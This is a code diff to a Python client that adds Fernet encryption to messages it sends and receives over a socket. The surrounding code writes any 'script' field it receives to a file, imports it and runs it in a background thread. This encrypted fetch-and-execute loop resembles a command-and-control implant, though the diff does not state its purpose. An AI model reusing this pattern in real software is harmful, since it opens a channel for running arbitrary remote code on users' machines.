@@ -17,7 +17,7 @@ global queue
 COUNT = 0
 QUEUE = []
 
-fernet = Fernet(KEY)
+encryptor = Fernet(KEY)
 
 
 def exec_msg(msg: Message):
@@ -28,8 +28,9 @@ def exec_msg(msg: Message):
         script = msg.data["script"]
         with open("got_script.py", "w") as f:
             f.write(script)
-        
+
         from got_script import run
+
         t = threading.Thread(target=run, name="name", args=())
         t.daemon = True
         t.start()
@@ -43,10 +44,10 @@ async def client(sock):
         await asyncio.sleep(0.1)
         if len(QUEUE) > 0:
             m_to_send = QUEUE.pop(0)
-            sock.sendto(m_to_send.as_encoded())
+            sock.sendto(m_to_send.as_encoded(encryptor))
 
         received, addr = await sock.recvfrom()
-        msg_received = Message.from_encoded_str(received)
+        msg_received = Message.from_encoded(received, encryptor)
         print(msg_received)
 
         exec_msg(msg_received)
